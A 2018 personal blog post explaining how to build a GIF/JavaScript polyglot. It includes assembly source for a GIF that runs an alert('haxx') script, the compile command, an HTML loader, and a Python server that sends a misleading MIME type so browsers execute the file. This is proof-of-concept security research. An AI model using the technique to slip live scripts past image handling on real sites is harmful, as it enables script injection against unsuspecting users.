---
title: "Gif Javascript Polyglots"
date: 2018-01-24T12:13:00-04:00

categories:
  - tech
tags:
  - security
  - ops
  - web

---

### The backstory

Recently I saw a feature on a product I work on where we allowed hotlinking to arbitrary gifs without pulling them in, mangling, and then saving for our own use. Right away I thought, "Well this isn't wise" and set off to find ways to abuse it. The easiest and most obvious was to link to an image and then swap it out for a less savoury one later. Kid stuff, right? Let's do some real damage. Spoiler alert: I made a really cool thing but didn't get to weaponize it the way I wanted to.

After proving that I could swap out images with ease from a server I controlled, I started looking for ways to embed executable into the image, which is how I stumbled upon this idea of _polyglots_. In this context, a polyglot is something that is valid code in two or more languages. For our use case, we want a gif/javascript polyglot. 

### Getting down to business

As always, research starts with Google and IRC. I had a feeling that something like this had been done before, so I set about finding papers, posts, or anything really that pointed me to what I was looking for. In short order, I found a couple of good resources that explained the attack and how to craft a malicious gif. 

The basic idea is to use ASM and manually assemble a GIF, filling in the required header and fields. By setting the width to a specific value of `10799`, when the gif is rendered as a script, this is interpreted as a `/*` in ASCII, which is the opening of a Javascript comment block. When interpreted as an img, the browser simply renders the image that wide. The content and fields of the gif are contained between the opening and closing comment blocks of the JS portions, and the comment is closed at the end of the gif. The JS to execute is tacked onto the end of the GIF and is executed when interpreted as a script. I have included a link to the original gist at the bottom of this post, but here is an example of one such gif:

```
; a hand-made GIF containing valid JavaScript code
; abusing header to start a JavaScript comment

; inspired by Saumil Shah's Deadly Pixels presentation

; Ange Albertini, BSD Licence 2013

; yamal gifjs.asm -o img.gif

WIDTH equ 10799 ; equivalent to 2f2a, which is '/*' in ASCII, thus starting an opening comment

HEIGTH equ 100 ; just to make it easier to spot

db 'GIF89a'
    dw WIDTH, HEIGTH

db 0 ; GCT
    db -1 ;  background color
    db 0 ; default aspect ratio
    ;db 0fch, 0feh, 0fch
    ;times COLORS db 0, 0, 0

; no need of Graphic Control Extension
 ; db 21h, 0f9h
 ; db GCESIZE ; size
 ; gce_start:
 ;     db 0 ; transparent background
 ;     dw 0 ; delay for anim
 ;     db 0 ; other transparent
 ; GCESIZE equ $ - gce_start
 ;     db 0 ; end of GCE

db 02ch ; Image descriptor
    dw 0, 0 ; NW corner
    dw WIDTH, HEIGTH ; w/h of image
    db 0    ; color table

db 2 ; lzw size

;db DATASIZE
;data_start:
;    db 00, 01, 04, 04
;    DATASIZE equ $ - data_start

db 0
db 3bh ; GIF terminator

; end of the GIF

db '*/'  ; closing the comment
db '=1;' ; creating a fake use of that GIF89a string

db 'alert("haxx");'
```
As you can see, we close the comment block at the end and add our own Javascript. When interpreted as a script, the parser skips over all the GIF-related stuff and just worries about the JS at the end.

### Compiling

As a product of my own stupidity and failure to follow directions, I mistakenly assumed for a bit that the recommended compiler, [yasm](http://yasm.tortall.net/), was Windows-only. After far too long fighting YASM and C++ runtime trying to get the stupid thing to work, I noticed that I could just pull the source and compile it on my local machine. Sweet! After that, compiling this was a breeze:

```
$ yasm ./gifjs.asm -o img.gif
```

### Execution and Exploitation

Unfortunately, here's where things get a little sad. In order to actually get this to work, I had to do it under some contrived conditions that, while not impossible, are unlikely (in my opinion). 

  1. You have to have the gif interpreted with `<script>` tags as opposed to `<img>` tags
  2. You have to send a misleading MIME type

These two conditions mean that it's unlikely you will find something in the wild which you can abuse. You're better off using a server you already control and setting up explotation conditions favorable to yourself.

To get this to run, I wrote the following tiny bit of HTML:

```html
This is a test
<img src="img.gif">
<script src="img.gif"></script>
```

As you can see, it just throws up a bit of test, displays the malicious GIF as an image, and then again as a script. If you pop open your browser and go to the file in your local filesystem (say, `/tmp/test.html` for instace), the gif will pop the alert box for you. Fun, right?

Now try uploading it to an image hosting site such as Imgur and sourcing it from there and you'll notice something interesting happens. Or rather, doesn't happen. If you try to run the above HTML but using a direct link to a .gif on imgur instead, you'll notice that your browser's console likely displays an error saying something to this effect:

```
Refused to execute script from 'https://i.imgur.com/IXGn93f.gif' because its MIME type ('image/gif') is not executable.
```

_Detour: what the heck is a MIME type?_

MIME types aren't really anything more complex than a label that gets stuck onto some data to tell the receiving end what type of data it is. This lets the client know how it can handle the data. This is just a label and is built on trust. What do we do with trust? We abuse it. Back to your regularly scheduled programming.

This brings me back to point #2: You need to send a misleading MIME type to convince the browser to execute your file. We already know that Imgur won't allow us to do that, so how do we do it? In my case, I used a simple bit of python.

```python
import SimpleHTTPServer
import SocketServer

PORT = 8000

class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    pass

Handler.extensions_map['.gif'] = 'application/octet-stream'

httpd = SocketServer.TCPServer(("", PORT), Handler)

print "serving at port", PORT
httpd.serve_forever()
```

This uses SimpleHTTPServer, which is already in Python's standard libraries, to serve the contents of the local directory. By default, SimpleHTTPServer will try and give things appropriate MIME types based on extensions, so we add a smal change to tell it to interpret `.gif` extensions as `application/octect-stream`, which browsers will execute. If I named that html file as `index.html`, I can now hit `http://127.0.0.1:8000/index.html` and get our malicious gif served back with a MIME type that it is okay with executing. The result? We run the JS compiled into the GIF.

### Conclusion

This is not a new or novel attack. This is also not something I feel is widely exploitable, but it is fairly sneaky and exposes a few areas of trust that we can abuse. 

  1. Browsers do little in the way of actual heuristics when trying to determine file type. At best, they will look at the extension and magic byte to try and determine if the file is what it claims to be.
  2. This is a valid GIF and a valid bit of JS, so heuristics would have to be more sophisticated to catch something like this.
  3. Browsers trust MIME types perhaps a bit too much.
  4. This would be easy to exploit and hard to detect using a site you control, since users wouldn't be able to see the JS that is being executed. Then again, they might see that `something.js` was being executed but might not be able to GET the file to see what is in it. Obfuscation level: 3/10.

It's interesting. It's fun. It's simple.

_References_

[https://ajinabraham.com/blog/bypassing-content-security-policy-with-a-jsgif-polyglot](https://ajinabraham.com/blog/bypassing-content-security-policy-with-a-jsgif-polyglot)
[https://gist.githubusercontent.com/ajinabraham/f2a057fb1930f94886a3/raw/62b8e455ad62c42222de9059cd0d20c1a79e2cdb/gifjs.asm](https://gist.githubusercontent.com/ajinabraham/f2a057fb1930f94886a3/raw/62b8e455ad62c42222de9059cd0d20c1a79e2cdb/gifjs.asm)
[http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html](http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html)



